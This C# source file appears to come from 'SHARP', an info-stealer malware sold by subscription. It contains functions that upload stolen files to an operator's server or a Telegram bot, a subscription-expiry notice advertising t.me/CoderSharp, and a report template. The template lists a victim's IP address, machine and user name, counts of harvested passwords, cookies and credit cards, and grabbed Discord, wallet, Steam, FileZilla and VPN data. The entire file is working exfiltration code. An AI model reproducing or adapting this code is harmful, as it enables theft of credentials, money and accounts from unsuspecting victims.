using System;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;

namespace SHARP
{
    public class SenderAPI
    {
      public static async Task TGotstuk(
        byte[] file,
        string filename,
        string contentType,
        string url,
        string apiKey)
      {
        if (apiKey != "gggf980fd98f98fd980fd890f98f09f08fd980fd909uitu94U098089U4TJ908ERGJ098R089GAR09G90ADRG098AR089GR908GAD90RG")
          Environment.Exit(0);
        try
        {
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
          WebClient webClient = new WebClient()
          {
            Proxy = (IWebProxy) null
          };
          string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
          webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
          string str2 = webClient.Encoding.GetString(file);
          string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) filename, (object) contentType, (object) str2);
          byte[] bytes = webClient.Encoding.GetBytes(s);
          webClient.UploadData(url, "POST", bytes);
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.Message);
        }
      }

      public static async Task MyPrivateServerOtstuk(string apiUrl, string fileName, byte[] fileData)
      {
        using (HttpClient client = new HttpClient())
        {
          MultipartFormDataContent content1 = new MultipartFormDataContent();
          ByteArrayContent content2 = new ByteArrayContent(fileData);
          content2.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
          content1.Add((HttpContent) content2, "file", fileName);
          int num = (await client.PostAsync(apiUrl, (HttpContent) content1)).IsSuccessStatusCode ? 1 : 0;
        }
      }

      public static async Task SubError()
      {
        HttpClient httpClient = new HttpClient();
        string requestUri = $"https://api.telegram.org/bot{Config.token}/sendMessage";
        string id = Config.id;
        string empty = string.Empty;
        string str = !(Config.language == "ru") ? "Your subscription has ended :(\nFraternize: t.me/CoderSharp" : "Ваша подписка закончилась :(\nОбратитесь: t.me/CoderSharp";
        string content = $"{{\r\n            \"chat_id\": {id},\r\n            \"text\": \"{str}\"\r\n        }}";
        HttpResponseMessage httpResponseMessage = await httpClient.PostAsync(requestUri, (HttpContent) new StringContent(content, Encoding.UTF8, "application/json"));
      }

      public static string Caption()
      {
        return $"\nPC USER INFORMATION:\n    \uD83D\uDC41 <code>{Help.IP}</code> {Counting.country}\n    \uD83D\uDC64 {Environment.MachineName} | {Environment.UserName}\n    ⚙️ <code>{SystemInfo.GetSystemVersion()}</code>\nBASIC INFORMATION:\n    Passwords - <code>{Counting.Passwords.ToString()}</code>\n    AutoFiles - <code>{Counting.AutoFill.ToString()}</code>\n    Cookies - <code>{Counting.Cookies.ToString()}</code>\n    CC - <code>{Counting.cc.ToString()}</code>\n GRABBED SOFTWARE:{(Counting.ds > 0 ? $"\n    ✅Discord (<b>{Counting.ds}</b>)" : "")}{(Counting.jabber > 0 ? "\n    ✅Jabber" : "")}{(Counting.totalcmd > 0 ? "\n    ✅TotalCommander" : "")}{(Counting.Wallets > 0 ? $"\n    ✅Wallets ( {StartWallets.getAllWallets()} ) " : "")}{(Counting.Telegram > 0 ? "\n    ✅Telegram" : "")}{(Counting.FileZilla > 0 ? $"\n    ✅FileZilla ({Counting.FileZilla.ToString()})" : "")}{(Counting.Steam > 0 ? "\n    ✅Steam" : "")}{(Counting.NordVPN > 0 ? "\n    ✅NordVPN" : "")}{(Counting.cgv > 0 ? "\n    ✅CyberGhostVPN" : "")}{(Counting.express > 0 ? "\n    ✅ExpressVPN" : "")}{(Counting.pia > 0 ? "\n    ✅PiaVPN" : "")}{(Counting.OpenVPN > 0 ? "\n    ✅OpenVPN" : "")}{(Counting.ProtonVPN > 0 ? "\n    ✅ProtonVPN" : "")}\n DOMAINS DETECTED:\n - {Help.GetDomainDetect(Help.ExploitDir + "\\")}";
      }
    }
}
